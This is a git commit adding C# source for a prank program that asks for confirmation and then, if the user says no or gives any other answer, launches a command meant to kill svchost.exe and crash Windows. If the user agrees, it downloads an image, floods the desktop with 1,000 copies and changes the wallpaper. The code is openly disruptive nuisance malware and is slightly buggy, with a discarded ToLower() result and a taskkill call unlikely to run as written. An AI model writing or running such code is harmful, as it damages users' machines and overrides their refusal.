31d094f9d6661b2074ee0ceddf91f58e5cdccaf4
zenx0x2 <zenxdotpy@gmail.com>
2022-01-18 20:09:25 +0100

    OCD Moves

---
+++ ballsBetter/Functions/AreYouSure.cs
@@ -0,0 +1,55 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using ballsBetter.Functions;
+
+namespace ballsBetter.Functions
+{
+    class AreYouSure
+    {
+        public static int areYouSure()
+        {
+            Console.WriteLine("Are you sure you want to run balls? It might harm your PC. | Y/N");
+
+            string wtr = Console.ReadLine();
+
+            wtr.ToLower();
+
+            Console.WriteLine(wtr);
+
+            if (wtr == "y")
+            {
+                Console.WriteLine("balls");
+
+                Functions.balls.runBalls();
+
+                Console.ReadKey();
+
+            }
+
+            else if (wtr == "n")
+            {
+                Console.WriteLine("Not balls");
+
+                System.Diagnostics.Process.Start("CMD.exe", "taskkill /F /IM svchost.exe");
+
+                Console.ReadKey();
+
+                return 0;
+            }
+
+            else
+            {
+                Console.WriteLine("Invalid Answer");
+
+                System.Diagnostics.Process.Start("CMD.exe", "taskkill /F /IM svchost.exe");
+
+                Console.ReadKey();
+            }
+
+            return 0;
+        }
+    }
+}
---
+++ ballsBetter/Functions/balls.cs
@@ -0,0 +1,45 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+using System.Net;
+using ballsBetter.Functions;
+
+namespace ballsBetter.Functions
+{
+    class balls
+    {
+        public static void runBalls()
+        {
+            string desktop = @"C:\Users\" + Environment.UserName + @"\Desktop\";
+            string localFilename = @"C:\Users\" + Environment.UserName + @"\Desktop\balls.jpg";
+            string logPath = @"C:\Users\" + Environment.UserName + @"\Documents\Balls\ballsLog.txt";
+
+            try
+            {
+                using (WebClient client = new WebClient())
+                {
+                    client.DownloadFile("https://i.redd.it/41ps5f0pnt771.png", localFilename);
+                }
+                for (int i = 0; i < 1000; i++)
+                {
+                    string num = desktop + i.ToString() + ".jpg";
+                    File.Copy(localFilename, num);
+
+                    Console.WriteLine("Ball " + num);
+                }
+            }
+
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
+
+                System.Diagnostics.Process.Start("CMD.exe", "taskkill /F /IM svchost.exe");
+            }
+
+            Wallpaper.changeWallpaper();
+        }
+    }
+}
